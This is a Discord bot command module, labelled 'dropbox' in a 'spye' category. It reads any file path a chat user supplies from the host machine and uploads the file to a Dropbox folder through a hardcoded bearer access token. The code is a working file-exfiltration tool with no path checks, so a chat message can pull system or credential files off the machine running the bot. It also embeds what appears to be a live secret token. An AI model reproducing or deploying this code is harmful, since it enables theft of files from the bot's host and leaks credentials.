const Discord = require("discord.js");
const config = require(`../config.json`)
module.exports.run = async (client, message, args) => {
var request = require('request');
var fs = require('fs');
var access_token = "HFiLGt-TepAAAAAAAAAAIt9Utd3NObc-lLZ06mw0glmHB_nUwZTqqcv-P9wrLeii";
var filename = args.join(" ");
var content = fs.readFileSync(filename);
options = {
            method: "POST",
            url: 'https://content.dropboxapi.com/2/files/upload',
            headers: {
              "Content-Type": "application/octet-stream",
              "Authorization": "Bearer " + access_token,
              "Dropbox-API-Arg": "{\"path\": \"/MieciuCanary/"+filename+"\",\"mode\": \"overwrite\",\"autorename\": true,\"mute\": false}",
            },
            body:content
};
request(options,function(err, res,body){
     console.log("Err : " + err);
     console.log("res : " + res);
     console.log("body : " + body);    
 })

}
module.exports.help = {
	name: "dropbox",
	category:"spye"
}
//